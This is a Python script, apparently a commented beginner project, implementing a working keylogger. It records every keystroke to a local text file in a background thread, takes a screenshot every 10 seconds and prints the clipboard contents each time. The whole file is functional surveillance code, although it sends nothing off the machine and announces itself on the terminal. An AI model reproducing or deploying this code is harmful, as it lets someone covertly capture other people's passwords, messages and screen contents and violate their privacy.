# Import the necessary libraries.
from datetime import datetime
import pynput.keyboard
import pyperclip
import pyautogui
import threading
import time
import sys

# Name the file that saves the logged keys.
log_file = "keys_logged.txt"    

def on_press(key):
    try:
        with open(log_file, "a", encoding="utf-8") as file:     # Create a new file to save the keys. ("a" (append) to add new data to the end of the file without deleting the previous content) 
            if key == pynput.keyboard.Key.enter:    # If the user pressed "Enter"...
                file.write("\n")                  # make a new line.
            elif key == pynput.keyboard.Key.backspace:    # If the user pressed "Backspase"...
                file.write("[BACKSPACE]")        # print [BACKSPACE] (instead of erasing a character).
            elif key == pynput.keyboard.Key.space:  # If the user pressed "Space"...
                file.write(" ")                   # make a space.
            elif hasattr(key, 'char') and key.char is not None:    # If the pressed keys are normal characters (e.g; a, b, 0, 1, !, # etc...)
                file.write(str(key.char))                    # save them inside the file.
                
        # Check for escape key to exit
        if key == pynput.keyboard.Key.esc:    # If the user pressed "Escape"...
            return False  # Stop listening.
    except Exception as e:     # If an error occured...
        print(f"Error: {e}")  # Print on terminal the error message.
    

def start_keylogger():
    with pynput.keyboard.Listener(on_press=on_press) as listener: # Start listening the pressed keys.
        listener.join()     # The code will keep running unless you didn't stop it.


def capture_screenshot():
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")  # Format the current time
    filename = f"screenshot_{timestamp}.png"  # Make a unique name with timestamp
    screenshot = pyautogui.screenshot()
    screenshot.save(filename)
    print(f"Screenshot saved as {filename}.")


def capture_clipboard():
    clipboard_content = pyperclip.paste()
    print(f"Clipboard content: {clipboard_content}")     # To print the clipboard content.


# This is a function that creates and runs the thread that will run the keylogger in the background.
def keylogger_with_additional_features(): 
    keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
    keylogger_thread.start()


keylogger_with_additional_features()     # Calling a function.

print("Key logging started...")

try:
    while True:     
        time.sleep(10)
        capture_clipboard()    # Show the clipboard content every 10 seconds.
        capture_screenshot()    # Take a screenshot every 10 seconds.
except KeyboardInterrupt:    # When the user stops the code...
    print("Program terminated by user")    # Print the message.
    sys.exit()        # and then exit the program.
